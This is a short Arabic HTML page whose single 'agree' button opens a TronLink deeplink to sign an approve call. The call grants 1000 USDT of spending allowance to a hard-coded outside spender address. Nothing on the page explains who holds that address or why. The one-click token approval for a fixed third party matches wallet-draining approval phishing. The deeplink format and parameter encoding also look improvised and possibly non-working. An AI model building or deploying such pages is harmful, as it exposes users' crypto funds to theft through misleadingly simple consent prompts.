<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>فتح TronLink لتوقيع approve</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    button {
      font-size: 20px;
      padding: 10px 20px;
      cursor: pointer;
    }
    #status {
      margin-top: 20px;
      color: red;
    }
  </style>
</head>
<body>

<h1>فتح TronLink لتوقيع 1000 USDT (approve)</h1>
<button id="openTronLinkBtn">موافقة</button>
<div id="status"></div>

<script>
  const usdtContractAddress = 'TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn';
  const spenderAddress = 'TWNvNo7d79eQ8VtZUeBoLjtyPYrYn6yXJf';
  const amount = 1000 * 1_000_000; // 1000 USDT مع 6 أرقام عشرية

  const statusDiv = document.getElementById('status');
  const btn = document.getElementById('openTronLinkBtn');

  btn.addEventListener('click', () => {
    // إعداد رابط deeplink
    const params = encodeURIComponent(`${spenderAddress},${amount}`);
    const deeplink = `tronlink://contract-call?contract=${usdtContractAddress}&function=approve&parameter=${params}`;

    // محاولة فتح التطبيق
    window.location.href = deeplink;

    // لو التطبيق مش موجود (بعد ثواني) نعرض رسالة
    setTimeout(() => {
      statusDiv.textContent = 'لم يتم العثور على تطبيق TronLink. يرجى تثبيته أولاً.';
    }, 2000);
  });
</script>

</body>
</html>
